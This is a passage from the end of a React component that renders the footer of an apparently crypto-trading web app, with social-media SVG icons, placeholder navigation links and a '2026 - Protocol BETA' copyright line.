                <path d="M21.944 2.506a1.5 1.5 0 0 0-1.53-.232L2.055 9.693a1.5 1.5 0 0 0 .104 2.82l4.184 1.32 1.768 5.694a.75.75 0 0 0 1.264.3l2.43-2.43 4.321 3.17a1.5 1.5 0 0 0 2.363-.938l2.813-16.03a1.5 1.5 0 0 0-.358-1.093zM10.07 14.902l-.96 2.88-.96-3.09 8.85-7.96-7.93 8.17zm-1.41-.528L4.5 13.05l14.46-5.94-10.3 7.264zm8.97 5.016-4.56-3.346 2.01-2.01-1.56 5.356z" />
              </svg>
            </a>
            <a href="#">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z" />
              </svg>
            </a>
          </div>
          <div className="footer-links">
            <div className="footer-col">
              <a href="#">Your Portfolio</a>
              <a href="#">Swap</a>
              <a href="#">Limit</a>
              <a href="#">AI</a>
              <a href="#">Explore</a>
            </div>
            <div className="footer-col">
              <a href="#">Blog</a>
              <a href="#">About</a>
              <a href="#">Products</a>
            </div>
          </div>
        </div>
        <div className="footer-bottom">
          <span>2026 - Protocol BETA</span>
          <a href="#">Disclaimer</a>
          <a href="#">Privacy Policy</a>
        </div>
      </footer>
    </div>
  );
}
